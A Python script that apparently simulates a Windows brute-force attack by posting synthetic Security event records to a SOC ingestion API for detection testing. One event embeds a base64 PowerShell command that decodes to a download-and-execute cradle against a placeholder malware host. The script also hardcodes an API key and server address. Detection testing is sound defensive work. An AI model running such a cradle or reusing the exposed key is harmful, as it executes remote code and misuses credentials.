"""
Windows Attack Simulator
Sends realistic Windows Event Log-format events to MCP SOC.
Simulates a brute force attack using the same format as the Windows agent.

Usage:
    python simulate_windows.py                    # uses default API key
    python simulate_windows.py <API_KEY>          # custom API key
"""

import sys
import time
import requests
from datetime import datetime, timezone

API_URL = "http://178.128.100.145:8000"
API_KEY = sys.argv[1] if len(sys.argv) > 1 else "soc_O5Yo1RbWckPnH2ffrG7OtAf5nMZbbrK9xSaqNd60uFU"
HEADERS = {"X-API-Key": API_KEY, "Content-Type": "application/json"}

HOSTNAME = "TestMachine"


def now_iso():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def win_event(event_id: int, message: str, channel: str = "Security", source: str = "Microsoft-Windows-Security-Auditing") -> dict:
    return {
        "timestamp": now_iso(),
        "message": message,
        "channel": channel,
        "event_id": event_id,
        "source": source,
        "computer": HOSTNAME,
        "level": 16,
    }


def post_events(records: list, label: str):
    r = requests.post(
        f"{API_URL}/ingest/syslog",
        headers=HEADERS,
        json={"records": records},
        timeout=10,
    )
    print(f"  [{r.status_code}] {label} — {len(records)} events")
    if r.status_code != 200:
        print(f"         ERROR: {r.text[:200]}")
    return r.status_code == 200


def check_pipeline():
    """Check if incidents/alerts were created after sending events."""
    try:
        # Try to get incidents (requires auth token, so we just check the server responds)
        r = requests.get(f"{API_URL}/health", timeout=5)
        print(f"\n  Server health: [{r.status_code}] {r.text[:100]}")
    except Exception as e:
        print(f"\n  Server unreachable: {e}")


def sep(title):
    print(f"\n{'='*55}")
    print(f"  {title}")
    print("=" * 55)


# ─── ATTACK 1: Brute Force (Event 4625 × 10) ───────────────────────────────
sep("Attack 1: Brute Force Login (10x Event 4625)")
print("  - Should trigger: windows_brute_force rule")
print("  - Should create: 10 detections -> 1 incident\n")

brute_events = []
for i in range(10):
    brute_events.append(win_event(
        event_id=4625,
        message=(
            "An account failed to log on.\r\n\r\n"
            "Subject:\r\n\tSecurity ID:\tNULL SID\r\n\tAccount Name:\t-\r\n\tAccount Domain:\t-\r\n\tLogon ID:\t0x0\r\n\r\n"
            "Logon Type:\t\t3\r\n\r\n"
            "Account For Which Logon Failed:\r\n"
            "\tSecurity ID:\tNULL SID\r\n"
            "\tAccount Name:\tAdministrator\r\n"
            "\tAccount Domain:\tWORKGROUP\r\n\r\n"
            "Failure Information:\r\n\tFailure Reason:\tUnknown user name or bad password.\r\n"
            "\tStatus:\t0xC000006D\r\n\tSub Status:\t0xC000006A"
        ),
        channel="Security",
    ))
    time.sleep(0.05)  # small gap between events

ok = post_events(brute_events, "Brute force (4625 ×10)")
if ok:
    print("  Events accepted by server ✓")
    print("  Waiting 5s for pipeline to process...")
    time.sleep(5)

# ─── ATTACK 2: Account Locked Out (Event 4740) ─────────────────────────────
sep("Attack 2: Account Lockout (Event 4740)")
lockout = [win_event(
    event_id=4740,
    message=(
        "A user account was locked out.\r\n\r\n"
        "Subject:\r\n\tSecurity ID:\tS-1-5-18\r\n\tAccount Name:\tDESKTOP-TEST$\r\n\r\n"
        "Account That Was Locked Out:\r\n\tSecurity ID:\tS-1-5-21-000000000-000000000-000000000-500\r\n"
        "\tAccount Name:\tAdministrator\r\n\r\n"
        "Additional Information:\r\n\tCaller Computer Name:\t127.0.0.1"
    ),
)]
post_events(lockout, "Account lockout (4740 ×1)")

# ─── ATTACK 3: PowerShell Obfuscated Command ─────────────────────────────
sep("Attack 3: PowerShell Encoded Command")
ps_event = [win_event(
    event_id=4688,
    message=(
        "A new process has been created.\r\n\r\n"
        "Creator Subject:\r\n\tAccount Name:\tadmin\r\n\r\n"
        "Process Information:\r\n"
        "\tNew Process ID:\t0x1234\r\n"
        "\tNew Process Name:\tpowershell.exe\r\n"
        "\tProcess Command Line:\tpowershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA=="
    ),
    channel="Security",
)]
post_events(ps_event, "PowerShell encoded (4688 ×1)")

# ─── SUMMARY ─────────────────────────────────────────────────────────────
sep("Pipeline Check")
check_pipeline()
print("""
  Next steps to verify:
  1. Go to https://mcpsoc.dev/incidents  (or /alerts)
  2. You should see a new incident from brute force in ~30s
  3. If nothing appears, run this on the server:
       docker compose logs agent-ingestion --tail=20
       docker compose logs agent-detection --tail=20

  Quick server test (run on DigitalOcean server):
       docker compose ps       <- all containers should be 'Up'
       docker compose logs mcp-broker --tail=5  <- check for errors
""")
